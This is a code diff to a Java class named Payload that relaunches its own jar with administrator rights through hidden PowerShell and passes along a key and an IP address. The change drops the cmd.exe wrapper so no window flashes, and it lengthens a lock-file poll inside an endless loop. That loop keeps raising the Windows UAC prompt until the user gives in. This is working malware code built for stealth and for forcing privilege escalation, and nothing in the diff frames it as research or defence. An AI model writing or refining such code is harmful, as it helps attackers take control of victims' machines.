@@ -157,26 +157,23 @@ public class Payload {
                 "Start-Process -FilePath '%s' -Verb RunAs -ArgumentList '-jar \"%s\" %s %s'",
                 javaExe, jarPath, key, ip
             );
-            
-            // Use cmd /c start to force the prompt on the visible desktop
-            String fullCmd = "cmd.exe /c start \"\" powershell.exe -NoProfile -WindowStyle Hidden -Command \"" + psCommand + "\"";
 
             FileOutputStream lockStream = new FileOutputStream(lockFile);
 
             while (true) {
                 log("Triggering UAC...");
                 
-                Process p = new ProcessBuilder("cmd.exe", "/c", "start", "", "powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psCommand).start();
-                p.waitFor(); 
+                // Launch PowerShell Hidden. No CMD window flashes.
+                Process p = new ProcessBuilder("powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psCommand).start();
                 
-                // Check every 15ms if the user clicked Yes (lock file deleted)
+                // Don't wait for PowerShell. Just spin-check for the lock file.
                 boolean accepted = false;
-                for (int i = 0; i < 400; i++) { 
+                for (int i = 0; i < 600; i++) { 
                     if (!lockFile.exists() || lockFile.delete()) {
                         accepted = true;
                         break;
                     }
-                    Thread.sleep(15);
+                    Thread.sleep(15); 
                 }
                 
                 if (accepted) {
